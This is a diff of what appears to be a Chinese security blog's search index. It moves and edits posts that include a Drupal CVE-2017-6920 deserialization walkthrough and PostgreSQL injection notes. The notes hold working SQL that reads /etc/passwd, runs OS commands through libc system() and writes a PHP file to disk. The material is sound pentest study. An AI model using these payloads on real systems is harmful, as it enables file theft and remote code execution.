@@ -60,9 +60,12 @@
 <p><code>validateForm()</code>的调用处在<code>http://172.16.26.132/drupal/admin/config/development/configuration/single/import</code>，<code>decode()</code>的参数直接从表单获取，于是通过<code>import</code>将恶意参数传递进去。</p>
 <p>要利用该漏洞进行远程代码执行，需要一个可以利用的类。<code>Drupal</code>使用命名空间的方式来管理类，可以全局实例化一个类，也可以反序列化一个类；该漏洞利用了反序列，因此需要找一个反序列类。通过<code>_destruct</code>以及<code>_wakeup</code>来定位类，全局搜索可以找到几个可利用的类。</p>
 <p>（1）<code>/vendor/symfony/process/Pipes/WindowsPipes.php</code>中的89行：</p>
-<p><img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal04.png" alt="label">通过反序列化这个类可以造成一个任意文件删除</p>
+<p><img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal04.png" alt="label"></p>
+<p><img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal05.png" alt="label"></p>
+<p>通过反序列化这个类可以造成一个任意文件删除。</p>
 <p>（2）<code>/vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php</code>中第37行：</p>
-<p><img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal05.png" alt="label">通过反序列化这个类可以造成写入webshell。</p>
+<p><img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal5.png" alt="drupal5"></p>
+<p>通过反序列化这个类可以造成写入webshell。</p>
 <p>（3）<code>/vendor/guzzlehttp/psr7/src/FnStream.php</code>中第48行：</p>
 <p><img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal6.png" alt="label">通过反序列化这个类可以造成任意无参数函数执行。</p>
 <h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><h3 id="1-远程代码执行"><a href="#1-远程代码执行" class="headerlink" title="1.远程代码执行"></a>1.远程代码执行</h3><p>利用<code>phpggc</code>生成序列化数据：</p>
@@ -123,6 +126,27 @@
       </tags>
   </entry>
   <entry>
+    <title>Kali安装Parallels Desktop Tools失败问题解决</title>
+    <url>/2021/04/23/Kali%E5%AE%89%E8%A3%85Parallels-Desktop-Tools%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/</url>
+    <content><![CDATA[<p>本人Mac安装的Paralles版本为16.1.3（49160）。安装的Kali内核版本为<code>Linux kali 5.10.0-kali4-amd64 #1 SMP Debian 5.10.19-1kali1 (2021-03-03) x86_64 GNU/Linux</code>。在给Kai虚拟机安装<code>Parallels Tools</code>的时候，出现如下错误：</p>
+<img src="/2021/04/23/Kali%E5%AE%89%E8%A3%85Parallels-Desktop-Tools%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/04/23/Kali%E5%AE%89%E8%A3%85Parallels-Desktop-Tools%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/Parallels.png" class>
+
+<p>这个问题的原因是Kali内核版本与Parallels Tools的版本不兼容。在此吐槽一下官方支持非常滞后，对Linux的支持烂透了。</p>
+<p>在论坛上找到解决办法，需要patch Parallels Tools安装目录下的kmods中的某两个文件。具体可以参看具体patch文件。</p>
+<p>我目前的版本适合的是kernel 5.9.1的patch。建议手工patch，具体修改内容参见patch文档。</p>
+<p>patch完之后，需要将解压的文件重新打包为<strong>prl_mod.tar.gz</strong>，打包命令为<code>tar -zcvf prl_mod.tar.gz</code>.</p>
+<p>参考链接：</p>
+<p><a href="https://forum.parallels.com/threads/path-for-kernel-5-9-1.351222/" target="_blank" rel="noopener">Path for kernel 5.9.1</a></p>
+<p><a href="https://forum.parallels.com/threads/tools-patch-procedure.351669/" target="_blank" rel="noopener">Tools Patch Procedure</a></p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Java递归解压缩</title>
     <url>/2017/02/11/Java%E9%80%92%E5%BD%92%E8%A7%A3%E5%8E%8B%E7%BC%A9/</url>
     <content><![CDATA[<p>做邮件分析的时候，因为前台上传的是邮件的压缩包，在后台处理的时候需要先对压缩包进行解压缩，然后再对邮件进行提取操作。</p>
@@ -148,116 +172,6 @@
       </categories>
       <tags>
         <tag>Java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PostgreSQL注入基本操作</title>
-    <url>/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
-    <content><![CDATA[<p>对PostgreSQL的基本操作和注入不是很了解，做一些笔记。</p>
-<p>常用函数查看基本信息：</p>
-<p><strong>查看版本信息</strong></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">version</span>();</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/version.png" alt="version"></p>
-<p><strong>查看当前用户</strong></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">current_user</span>;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/current_user.png" alt="current_user"></p>
-<p><strong>查看启动该sesson的用户</strong></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">session_user</span>;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/session_user.png" alt="sesesion_user"></p>
-<p><strong>查看当前数据库</strong></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> current_database();</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/current_database.png" alt="current_database"></p>
-<p><strong>PostgreSQL下的IF</strong></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">CASE </span><br><span class="line">      WHEN condition_1  THEN result_1</span><br><span class="line">      WHEN condition_2  THEN result_2</span><br><span class="line">      [WHEN ...]</span><br><span class="line">      [ELSE else_result]</span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/case_when.png" alt="case_when"></p>
-<p><strong>读取文件</strong></p>
-<p><strong>注意：</strong>需要<code>Superuser</code>权限，<strong>低版本</strong><code>pg_read_file</code>不支持绝对路径，仅能读取<code>data_directory</code>目录下的文件。可以使用<code>show data_directory</code>获取路径。</p>
-<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/data_directory.png" alt="data_directory"></p>
-<p>访问<code>data_directory</code>路径下的文件，使用相对路径也可。</p>
-<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/data_directory3.png" alt="data_directory3"></p>
-<ul>
-<li>创建数据表把读到的文件copy入表:</li>
-</ul>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> demo;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> demo(t <span class="built_in">TEXT</span>);</span><br><span class="line">COPY demo FROM '/etc/passwd';</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> demo <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
-
-<p>结果如下所示：（读取一行）</p>
-<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/data_directory2.png" alt="data_directory2"></p>
-<ul>
-<li>利用postgresql大对象处理来读文件</li>
-</ul>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> lo_import(<span class="string">'/etc/passwd'</span>,<span class="number">12345678</span>);</span><br><span class="line"><span class="keyword">select</span> array_agg(b)::<span class="built_in">text</span>::<span class="built_in">int</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">encode</span>(<span class="keyword">data</span>,<span class="string">'hex'</span>)b,pageno <span class="keyword">from</span> pg_largeobject <span class="keyword">where</span> loid=<span class="number">12345678</span> <span class="keyword">order</span> <span class="keyword">by</span> pageno)a</span><br></pre></td></tr></table></figure>
-
-<p>结果如下所示：</p>
-<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/data_directory4.png" alt="data_directory4"></p>
-<ul>
-<li>高版本直接利用pg_read_file读取文件：</li>
-</ul>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> pg_read_file(filepath+filename);</span><br></pre></td></tr></table></figure>
-
-<p>结果如下所示：</p>
-<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/read_file.png" alt="read_file"></p>
-<p><strong>执行命令</strong></p>
-<p> Postgresql 8.2以下的版本直接调用/lib/libc.so.6或者/lib64/libc.so.6，可以执行命令：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> <span class="keyword">system</span>(cstring) <span class="keyword">returns</span> <span class="built_in">int</span> <span class="keyword">AS</span> <span class="string">'/lib/libc.so.6'</span>, <span class="string">'system'</span> <span class="keyword">language</span> C <span class="keyword">strict</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> <span class="keyword">system</span>(cstring) <span class="keyword">returns</span> <span class="built_in">int</span> <span class="keyword">AS</span> <span class="string">'/lib64/libc.so.6'</span>, <span class="string">'system'</span> <span class="keyword">language</span> C <span class="keyword">strict</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">system</span>(<span class="string">'id'</span>);</span><br></pre></td></tr></table></figure>
-
-<p>需要注意的是：Ubuntu中libc.so.6位于/lib/x86_64-linux-gnu目录下。高版本的系统存在安全机制无法        调用系统libc.sso.6，需要手动利用UDF进行命令执行。先查看postgresql支持的扩展语言：select *         from pg_language; Postgresql默认支持C，可以自己编译so库去创建执行命令的函数利用。</p>
-<p>当postgresql版本高于8.2存在安全机制无法调用系统libc.so.6所以需要自己利用UDF进行命令执行，具体参加下面参考文章。</p>
-<p><strong>写入文件</strong></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">COPY (<span class="keyword">select</span> <span class="string">'&lt;?php phpinfo();?&gt;'</span>) <span class="keyword">to</span> <span class="string">'/tmp/1.php'</span>;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/save.png" alt="save"></p>
-<p><strong>参考文章：</strong></p>
-<p><a href="https://docs.ioin.in/writeup/www.jianfensec.com/_postgresql_getshell_html/index.html" target="_blank" rel="noopener">postgresql高版本UDF提权技巧</a></p>
-<p><a href="http://drops.xmd5.com/static/drops/tips-6449.html" target="_blank" rel="noopener">Hacking PostgreSQL</a></p>
-<p>[渗透中利用postgresql getshell](<a href="https://jianfensec.com/渗透测试/渗透中利用postgresql" target="_blank" rel="noopener">https://jianfensec.com/渗透测试/渗透中利用postgresql</a> getshell/)</p>
-<p><a href="https://pulsesecurity.co.nz/articles/postgres-sqli" target="_blank" rel="noopener">SQL Injection and Postgres - An adventure to eventual RCE</a></p>
-<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-blind" target="_blank" rel="noopener">PostgreSQL injection</a></p>
-<p><a href="https://www.unix-ninja.com/p/postgresql_for_red_teams" target="_blank" rel="noopener">PostgreSQL for red teams</a></p>
-]]></content>
-      <categories>
-        <category>Penetration Testing</category>
-      </categories>
-      <tags>
-        <tag>PostgreSQL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Kali安装Parallels Desktop Tools失败问题解决</title>
-    <url>/2021/04/23/Kali%E5%AE%89%E8%A3%85Parallels-Desktop-Tools%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/</url>
-    <content><![CDATA[<p>本人Mac安装的Paralles版本为16.1.3（49160）。安装的Kali内核版本为<code>Linux kali 5.10.0-kali4-amd64 #1 SMP Debian 5.10.19-1kali1 (2021-03-03) x86_64 GNU/Linux</code>。在给Kai虚拟机安装<code>Parallels Tools</code>的时候，出现如下错误：</p>
-<img src="/2021/04/23/Kali%E5%AE%89%E8%A3%85Parallels-Desktop-Tools%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/04/23/Kali%E5%AE%89%E8%A3%85Parallels-Desktop-Tools%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/Parallels.png" class>
-
-<p>这个问题的原因是Kali内核版本与Parallels Tools的版本不兼容。在此吐槽一下官方支持非常滞后，对Linux的支持烂透了。</p>
-<p>在论坛上找到解决办法，需要patch Parallels Tools安装目录下的kmods中的某两个文件。具体可以参看具体patch文件。</p>
-<p>我目前的版本适合的是kernel 5.9.1的patch。建议手工patch，具体修改内容参见patch文档。</p>
-<p>patch完之后，需要将解压的文件重新打包为<strong>prl_mod.tar.gz</strong>，打包命令为<code>tar -zcvf prl_mod.tar.gz</code>.</p>
-<p>参考链接：</p>
-<p><a href="https://forum.parallels.com/threads/path-for-kernel-5-9-1.351222/" target="_blank" rel="noopener">Path for kernel 5.9.1</a></p>
-<p><a href="https://forum.parallels.com/threads/tools-patch-procedure.351669/" target="_blank" rel="noopener">Tools Patch Procedure</a></p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>On The Way</title>
-    <url>/2019/08/27/On-The-Way/</url>
-    <content><![CDATA[<p>To be a warrior is not a simple matter of wishing to be one. It is rather an endless struggle that will go on to the very last moment of our lives. Nobody is born a warrior, in exactly the same way that nobody is born an average man. We make ourselves one or the other.                                                                                                                  </p>
-<p>​                                                                                                                                                              -Carlos Casteneda -</p>
-]]></content>
-      <categories>
-        <category>Essay</category>
-      </categories>
-      <tags>
-        <tag>Beautiful writing</tag>
       </tags>
   </entry>
   <entry>
@@ -478,6 +392,181 @@
       </tags>
   </entry>
   <entry>
+    <title>On The Way</title>
+    <url>/2019/08/27/On-The-Way/</url>
+    <content><![CDATA[<p>To be a warrior is not a simple matter of wishing to be one. It is rather an endless struggle that will go on to the very last moment of our lives. Nobody is born a warrior, in exactly the same way that nobody is born an average man. We make ourselves one or the other.                                                                                                                  </p>
+<p>​                                                                                                                                                              -Carlos Casteneda -</p>
+]]></content>
+      <categories>
+        <category>Essay</category>
+      </categories>
+      <tags>
+        <tag>Beautiful writing</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PostgreSQL注入基本操作</title>
+    <url>/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
+    <content><![CDATA[<p>对PostgreSQL的基本操作和注入不是很了解，做一些笔记。</p>
+<p>常用函数查看基本信息：</p>
+<p><strong>查看版本信息</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">version</span>();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/version.png" alt="version"></p>
+<p><strong>查看当前用户</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">current_user</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/current_user.png" alt="current_user"></p>
+<p><strong>查看启动该sesson的用户</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">session_user</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/session_user.png" alt="sesesion_user"></p>
+<p><strong>查看当前数据库</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> current_database();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/current_database.png" alt="current_database"></p>
+<p><strong>PostgreSQL下的IF</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">CASE </span><br><span class="line">      WHEN condition_1  THEN result_1</span><br><span class="line">      WHEN condition_2  THEN result_2</span><br><span class="line">      [WHEN ...]</span><br><span class="line">      [ELSE else_result]</span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/case_when.png" alt="case_when"></p>
+<p><strong>读取文件</strong></p>
+<p><strong>注意：</strong>需要<code>Superuser</code>权限，<strong>低版本</strong><code>pg_read_file</code>不支持绝对路径，仅能读取<code>data_directory</code>目录下的文件。可以使用<code>show data_directory</code>获取路径。</p>
+<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/data_directory.png" alt="data_directory"></p>
+<p>访问<code>data_directory</code>路径下的文件，使用相对路径也可。</p>
+<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/data_directory3.png" alt="data_directory3"></p>
+<ul>
+<li>创建数据表把读到的文件copy入表:</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> demo;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> demo(t <span class="built_in">TEXT</span>);</span><br><span class="line">COPY demo FROM '/etc/passwd';</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> demo <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+
+<p>结果如下所示：（读取一行）</p>
+<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/data_directory2.png" alt="data_directory2"></p>
+<ul>
+<li>利用postgresql大对象处理来读文件</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> lo_import(<span class="string">'/etc/passwd'</span>,<span class="number">12345678</span>);</span><br><span class="line"><span class="keyword">select</span> array_agg(b)::<span class="built_in">text</span>::<span class="built_in">int</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">encode</span>(<span class="keyword">data</span>,<span class="string">'hex'</span>)b,pageno <span class="keyword">from</span> pg_largeobject <span class="keyword">where</span> loid=<span class="number">12345678</span> <span class="keyword">order</span> <span class="keyword">by</span> pageno)a</span><br></pre></td></tr></table></figure>
+
+<p>结果如下所示：</p>
+<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/data_directory4.png" alt="data_directory4"></p>
+<ul>
+<li>高版本直接利用pg_read_file读取文件：</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> pg_read_file(filepath+filename);</span><br></pre></td></tr></table></figure>
+
+<p>结果如下所示：</p>
+<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/read_file.png" alt="read_file"></p>
+<p><strong>执行命令</strong></p>
+<p> Postgresql 8.2以下的版本直接调用/lib/libc.so.6或者/lib64/libc.so.6，可以执行命令：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> <span class="keyword">system</span>(cstring) <span class="keyword">returns</span> <span class="built_in">int</span> <span class="keyword">AS</span> <span class="string">'/lib/libc.so.6'</span>, <span class="string">'system'</span> <span class="keyword">language</span> C <span class="keyword">strict</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> <span class="keyword">system</span>(cstring) <span class="keyword">returns</span> <span class="built_in">int</span> <span class="keyword">AS</span> <span class="string">'/lib64/libc.so.6'</span>, <span class="string">'system'</span> <span class="keyword">language</span> C <span class="keyword">strict</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">system</span>(<span class="string">'id'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是：Ubuntu中libc.so.6位于/lib/x86_64-linux-gnu目录下。高版本的系统存在安全机制无法        调用系统libc.sso.6，需要手动利用UDF进行命令执行。先查看postgresql支持的扩展语言：select *         from pg_language; Postgresql默认支持C，可以自己编译so库去创建执行命令的函数利用。</p>
+<p>当postgresql版本高于8.2存在安全机制无法调用系统libc.so.6所以需要自己利用UDF进行命令执行，具体参加下面参考文章。</p>
+<p><strong>写入文件</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">COPY (<span class="keyword">select</span> <span class="string">'&lt;?php phpinfo();?&gt;'</span>) <span class="keyword">to</span> <span class="string">'/tmp/1.php'</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/save.png" alt="save"></p>
+<p><strong>参考文章：</strong></p>
+<p><a href="https://docs.ioin.in/writeup/www.jianfensec.com/_postgresql_getshell_html/index.html" target="_blank" rel="noopener">postgresql高版本UDF提权技巧</a></p>
+<p><a href="http://drops.xmd5.com/static/drops/tips-6449.html" target="_blank" rel="noopener">Hacking PostgreSQL</a></p>
+<p>[渗透中利用postgresql getshell](<a href="https://jianfensec.com/渗透测试/渗透中利用postgresql" target="_blank" rel="noopener">https://jianfensec.com/渗透测试/渗透中利用postgresql</a> getshell/)</p>
+<p><a href="https://pulsesecurity.co.nz/articles/postgres-sqli" target="_blank" rel="noopener">SQL Injection and Postgres - An adventure to eventual RCE</a></p>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-blind" target="_blank" rel="noopener">PostgreSQL injection</a></p>
+<p><a href="https://www.unix-ninja.com/p/postgresql_for_red_teams" target="_blank" rel="noopener">PostgreSQL for red teams</a></p>
+]]></content>
+      <categories>
+        <category>Penetration Testing</category>
+      </categories>
+      <tags>
+        <tag>PostgreSQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ubuntu 18.04安装TYPO3 9.3.0</title>
+    <url>/2018/06/12/ubuntu-18-04%E5%AE%89%E8%A3%85TYPO3-9-3-0/</url>
+    <content><![CDATA[<h2 id="环境概况"><a href="#环境概况" class="headerlink" title="环境概况"></a>环境概况</h2><p>本实验环境采用的是Ubuntu 18.04，Apache版本为2.4.29，PHP版本为7.3.PHP版本为7.2的时候出现了未知错误，导致一直安装不成功，无奈切换成PHP7.3</p>
+<p>PHP7.3在Ubuntu 18.04上的安装步骤如下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install software-properties-common</span><br><span class="line">sudo add-apt-repository ppa:ondrej/php</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install php7.3 libapache2-mod-php7.3 php7.3-cli php7.3-mysql php7.3-gd php7.3-imagick php7.3-recode php7.3-tidy php7.3-xmlrpc php7.3-common php7.3-curl php7.3-mbstring php7.3-xml php7.3-bcmath php7.3-bz2 php7.3-intl php7.3-json php7.3-readline php7.3-zip</span><br></pre></td></tr></table></figure>
+
+<p>PHP7.3没有安装FPM，所以需要单独安装FPM</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install php7.3-fpm</span><br></pre></td></tr></table></figure>
+
+<p>因为我本地安装了PHP7.2和PHP7.3两个版本，为了让Apache采用PHP7.3来解析脚本，需要执行下列命令：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo a2dismod php7.2</span><br><span class="line">sudo a2enmod php7.3</span><br><span class="line">sudo service apache2 restart</span><br></pre></td></tr></table></figure>
+
+<p>多版本PHP的切换可以使用一下命令：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --config php</span><br></pre></td></tr></table></figure>
+
+<p>根据提示进行选择即可。</p>
+<h2 id="TYPO3-9-3-0安装"><a href="#TYPO3-9-3-0安装" class="headerlink" title="TYPO3 9.3.0安装"></a>TYPO3 9.3.0安装</h2><p>将下载的TYPO3.CMS-9.3.0.tar.gz解压缩放到/var/www/htdocs/目录下，我这里解压缩之后的文件夹命名为typo3，进入typo3,执行<code>composer</code>安装所需的包。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo composer install --no-dev</span><br></pre></td></tr></table></figure>
+
+<p>修改Apache默认路径的执行权限：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chown -R www-data:www-data /var/www/htdocs/typo3/</span><br><span class="line">sudo chmod -R 755 /var/www/htdocs/typo3/</span><br></pre></td></tr></table></figure>
+
+<p>配置Apache：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo code /etc/apache2/sites-available/typo3.conf --user-data-dir</span><br></pre></td></tr></table></figure>
+
+<p>内容修改如下：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *<span class="attr">:80</span>&gt;</span></span><br><span class="line">ServerName typo3.example.com</span><br><span class="line">DocumentRoot /var/www/htdocs</span><br><span class="line"><span class="tag">&lt;<span class="name">Directory</span> /<span class="attr">var</span>/<span class="attr">www</span>/<span class="attr">htdocs</span>/<span class="attr">typo3</span>/&gt;</span></span><br><span class="line">Options +FollowSymlinks</span><br><span class="line">AllowOverride All</span><br><span class="line">Require all granted</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line">ErrorLog /var/log/apache2/typo3.example.com-error_log</span><br><span class="line">CustomLog /var/log/apache2/typo3.example.com-access_log common</span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>继续执行如下命令，使得typo3.conf生效及加载必要的模块：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo a2dissite 000-default.conf</span><br><span class="line">sudo a2ensite typo3.conf</span><br><span class="line">sudo a2enmod rewrite</span><br><span class="line">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure>
+
+<p>安装ImageMagick/GraphicsMagick，推荐ImageMagick：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install imagemagick</span><br></pre></td></tr></table></figure>
+
+<p>TYPO3安装的时候，需要修改php.ini中的几个参数，到目录/etc/php/7.3/fpm/php.ini下修改即可。</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">max_execution_time = 360</span><br><span class="line">max_input_vars = 1500</span><br></pre></td></tr></table></figure>
+
+<h2 id="配置xdebug-ini"><a href="#配置xdebug-ini" class="headerlink" title="配置xdebug.ini"></a>配置xdebug.ini</h2><p>xdebug.ini文件路径为/etc/php/7.3/mods-available/xdebug.ini</p>
+<p>具体配置信息如下：</p>
